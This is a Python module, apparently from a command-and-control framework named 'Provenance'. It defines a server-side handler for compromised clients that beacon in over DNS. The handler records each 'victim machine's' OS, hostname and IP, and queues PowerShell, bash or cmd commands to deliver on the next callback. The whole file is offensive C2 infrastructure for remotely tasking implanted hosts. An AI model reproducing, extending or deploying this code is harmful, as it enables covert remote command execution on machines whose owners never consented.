from socketserver import BaseRequestHandler
from backend.handlers.protocolhandler import ProtocolHandler
from backend.handlers.resolution import DNSHandler
from datetime import datetime
from util.structs import CommandType, Command
from collections import deque
from typing import Union


class ProvenanceClientHandler(BaseRequestHandler):
    beacons = {
        "DNS": DNSHandler
    }

    _client_count = 0

    """ Builtin Functions"""

    def __init__(self, request, client_address, serverinfo, handler, hostname=None):
        # Superclass initialization
        self.request = request
        self.client_address = client_address
        self.server = serverinfo
        # Subclass Initialization
        self._hostname = hostname or f"Client_{ProvenanceClientHandler._client_count}"
        self._os = "N/A"
        self._queued_commands = deque()
        self._sent_commands = []
        self._command_count = 0
        self._last_active: Union[datetime, None] = None
        self._synchronized = False
        self._protocol_handler = None
        
        h = self.beacons[handler]
        self._protocol_handler = h(
            ip=client_address[0],
            socket=request[1] if request else None
        )
        ProvenanceClientHandler._client_count += 1

    def __repr__(self):
        return f"ProvenanceClient{{{self.server[1]}, {self._hostname}}}"

    def decode(self, data):
        beacon = data["beacon"]
        os = data["os"]
        hostname = data["hostname"]
        ip = data["ip"]
        commands = data["commands"]

        beacon_handler = ProvenanceClientHandler.beacons[beacon]
        self._protocol_handler = beacon_handler(ip, None)
        self._os = os
        self._hostname = hostname
        self.client_address = (ip, None)
        self._last_active = None
        if commands:
            for c in commands:
                self.queue_command(
                    ctype=c["type"],
                    cmd=c["command"]
                )
            # TODO: change uid to not numbers so we don't have to update UID to correct value
            self._command_count = int(commands[-1]["uid"])

    def encode(self):
        return {
            "beacon": self.beacon,
            "os": self.os,
            "hostname": self._hostname,
            "ip": self.ip,
            "active": self.last_active,
            "commands": [Command.encode(c) for c in self._queued_commands]
        }

    # Application-Based Methods

    def handle(self, request, client_address):
        """
        The method required by BaseRequestHandler that handles the
        incoming request. Will tell the underlying protocol
        handler (DNS, HTTP, ICMP, etc) to send the given command if there
        is one queued, else send NOP
        :return:  None
        """
        # Update the details of the client
        self.client_address = client_address
        self.request = request
        # If dont have a protocol handler, we added the
        # machine manually OR  we are restoring from backup
        # Either case we don't have an active socket and must 
        # use the socket from the incoming request
        if self._protocol_handler.socket is None:
            self._protocol_handler.socket = request[1]
        
        _, port = self.client_address
        self._last_active = datetime.now()
        if not self._synchronized:
            platform, hostname = self._protocol_handler.synchronize(self.request, port)
            self._os = platform
            self._hostname = hostname
            self._synchronized = True
        else:
            if self._queued_commands:
                next_cmd = self._queued_commands.popleft()
            else:
                next_cmd = Command(CommandType.NOP)
            self._protocol_handler.handle_request(self.request, port, next_cmd)
            self._sent_commands.append((self._command_count, next_cmd))

    def queue_command(self, ctype, cmd):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        convert = {"ps": CommandType.PS, "bash": CommandType.BASH, "cmd": CommandType.CMD}
        command_type = convert[ctype]
        self._queued_commands.append(Command(command_type, cmd, self._command_count))
        self._command_count += 1

    def remove_command(self, cmd_id):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param cmd_id: the id of the command to be deleted
        :return: None
        """
        for cmd in self._queued_commands:
            if cmd.uid == cmd_id:
                self._queued_commands.remove(cmd)

    # Backend Methods for model querying

    @property
    def os(self):
        return self._os

    @property
    def queued_commands(self):
        return self._queued_commands

    @property
    def get_sent_commands(self):
        return self._sent_commands

    @property
    def last_active(self):
        # TODO: change to be datetime object not string
        # TODO: and convert encode
        if not self._last_active:
            return None
        else:
            delta = datetime.now() - self._last_active
            return delta.seconds // 60

    @property
    def get_command_count(self):
        return self._command_count

    @property
    def hostname(self):
        return self._hostname

    @property
    def ip(self):
        if not self.client_address:
            return None
        return self.client_address[0]

    @property
    def beacon(self):
        if self._protocol_handler:
            return self._protocol_handler.__repr__()
        return None
